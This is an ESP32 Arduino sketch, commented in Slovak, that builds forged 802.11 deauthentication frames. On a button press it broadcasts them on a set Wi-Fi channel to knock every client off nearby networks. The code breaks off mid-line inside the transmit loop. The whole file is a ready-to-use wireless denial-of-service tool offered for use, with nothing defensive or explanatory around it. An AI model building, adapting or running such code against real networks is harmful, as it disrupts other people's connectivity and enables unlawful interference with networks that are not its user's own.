#include <WiFi.h>
#include "esp_wifi.h"

// Definícia tlačidiel a LED
#define START_BUTTON_PIN 12  // Tlačidlo "Start" na pine 12
#define STOP_BUTTON_PIN 13   // Tlačidlo "Stop" na pine 13
#define GREEN_LED_PIN 14     // Zelená LED na pine 14

// Cieľová MAC adresa (MAC zariadenia, ktoré chceme odpojiť)
uint8_t target_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};  // Broadcast (odoslanie všetkým)

// Počet deauth paketov, ktoré chceme odoslať v jednej dávke
int num_deauth_packets = 10;

// Príznak pre indikáciu, či sa práve odosielajú deauth pakety
bool sendingDeauth = false;

void setup() {
  Serial.begin(115200);
  
  // Inicializácia tlačidiel a LED
  pinMode(START_BUTTON_PIN, INPUT_PULLUP);  // Používame vnútorný pull-up rezistor
  pinMode(STOP_BUTTON_PIN, INPUT_PULLUP);   // Používame vnútorný pull-up rezistor
  pinMode(GREEN_LED_PIN, OUTPUT);           // Nastavíme zelenú LED ako výstup ("S REZISTOROM 220 OHM")
  
  // Zhasnutie LED na začiatku
  digitalWrite(GREEN_LED_PIN, LOW);

  // Inicializácia WiFi v režime stanice (monitorovací režim)
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);


  //               DOWN HERE CHANGE TO YOUR WiFi CHANNEL !
  // Nastavenie na kanál 11 (2.4 GHz) < --------------------------------------------------------------- < HERE CHANGE TO YOUR WiFi CHANNEL !
  esp_wifi_set_channel(11, WIFI_SECOND_CHAN_NONE);
    // ! CHANGE TO YOUR SPECIFFIC CHANNEL ! 
}

void loop() {
  // Kontrola tlačidla "Start"
  if (digitalRead(START_BUTTON_PIN) == LOW && !sendingDeauth) {
    // Ak je tlačidlo stlačené a rušenie nie je aktívne
    sendingDeauth = true;
    Serial.println("Start button pressed, starting deauth packets");
    digitalWrite(GREEN_LED_PIN, HIGH);  // Rozsvietenie LED
  }

  // Kontrola tlačidla "Stop"
  if (digitalRead(STOP_BUTTON_PIN) == LOW && sendingDeauth) {
    // Ak je tlačidlo stlačené a rušenie je aktívne
    sendingDeauth = false;
    Serial.println("Stop button pressed, stopping deauth packets");
    digitalWrite(GREEN_LED_PIN, LOW);   // Zhasnutie LED
  }

  // Ak je aktívne odosielanie deauth paketov
  if (sendingDeauth) {
    sendDeauthPackets();
  }

  delay(100);  // Malé oneskorenie na zníženie záťaže procesora
}

// Funkcia na vytvorenie a odoslanie deauth paketov
void sendDeauthPackets() {
  // Deauth paket (v hexadecimálnom formáte)
  const uint8_t deauth_packet[26] = {
    0xC0, 0x00,             // Typ a Subtyp rámca (0xC0 = Deauthentication)
    0x3A, 0x01,             // Duration
    target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5],  // Cieľová MAC
    target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5],  // Zdrojová MAC (môže byť zmenená)
    target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5],  // BSSID (MAC AP)
    0x00, 0x00,             // Sekvenčné číslo
    0x07, 0x00              // Dôvod deauth (0x07 = Class 3 frame received from nonassociated STA)
  };

  // Odoslanie deauth paketov
  for (int i = 0; i < num_deauth_packets; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth
